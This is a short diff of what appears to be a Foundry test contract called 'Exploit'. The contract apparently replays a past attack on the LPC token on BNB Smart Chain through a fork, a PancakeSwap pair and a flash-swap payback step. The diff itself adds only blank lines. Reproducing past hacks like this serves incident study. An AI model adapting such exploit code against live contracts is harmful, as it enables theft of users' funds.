@@ -22,6 +22,7 @@ address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
 address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;
 
 contract Exploit is Test {
+
     function setUp() public {
         cheat.createSelectFork("bsc", 19_852_596);
         cheat.label(LPC, "LPC");
@@ -60,4 +61,5 @@ contract Exploit is Test {
         uint256 paybackAmount = amount0 / 90 / 100 * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%
         IERC20(LPC).transfer(pancakePair, paybackAmount);
     }
+
 }
